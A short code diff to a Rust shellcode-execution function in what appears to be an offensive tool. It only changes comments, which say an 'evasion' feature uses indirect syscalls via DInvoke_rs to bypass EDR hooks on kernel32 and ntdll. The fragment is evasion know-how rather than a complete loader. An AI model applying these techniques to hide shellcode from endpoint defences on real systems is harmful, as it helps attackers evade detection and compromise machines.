@@ -142,10 +142,8 @@ unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String
 
     #[cfg(feature = "evasion")]
     {
-        // Use dinvoke_rs indirect syscalls instead of direct winapi calls
-        // NtAllocateVirtualMemory instead of VirtualAlloc
-        // NtProtectVirtualMemory instead of VirtualProtect
-        // This avoids EDR hooks on kernel32/ntdll
+        // Indirect syscalls via DInvoke_rs by @Kudaes (https://github.com/Kudaes/DInvoke_rs)
+        // Bypasses EDR hooks on kernel32/ntdll by resolving syscall numbers at runtime
         let mut base_address: *mut winapi::ctypes::c_void = ptr::null_mut();
         let mut region_size: usize = buffer_size;
 
